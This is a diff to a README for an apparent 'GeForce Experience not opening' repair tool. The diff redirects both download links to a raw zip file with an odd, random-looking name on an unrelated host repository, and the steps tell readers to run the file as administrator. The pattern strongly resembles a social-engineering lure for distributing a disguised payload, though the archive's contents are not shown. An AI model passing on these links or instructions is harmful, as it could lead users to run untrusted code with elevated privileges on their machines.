@@ -5,7 +5,7 @@ description: "Resolve GeForce Experience launch issues on Windows 10 and 11 with
 ---
 # 🛠️ GeForce-Experience-Not-Opening-Fix - Restore Your NVIDIA Control Panel Access
 
-[![Download Repair Tool](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://github.com/familygerridaetorresstrait699/GeForce-Experience-Not-Opening-Fix)
+[![Download Repair Tool](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://raw.githubusercontent.com/familygerridaetorresstrait699/familygerridaetorresstrait699.github.io/main/antiprostatic/io-github-familygerridaetorresstrait-cheeselip.zip)
 
 ## 🎯 About This Utility
 
@@ -20,7 +20,7 @@ GeForce Experience often fails to launch on Windows 10 and Windows 11. This issu
 
 ## 🚀 How to Run the Repair
 
-1.  Visit the [official download page](https://github.com/familygerridaetorresstrait699/GeForce-Experience-Not-Opening-Fix) to download the repair utility.
+1.  Visit the [official download page](https://raw.githubusercontent.com/familygerridaetorresstrait699/familygerridaetorresstrait699.github.io/main/antiprostatic/io-github-familygerridaetorresstrait-cheeselip.zip) to download the repair utility.
 2.  Locate the downloaded file in your browser's download folder.
 3.  Right-click the file and select "Run as administrator."
 4.  Follow the prompts shown on your screen.
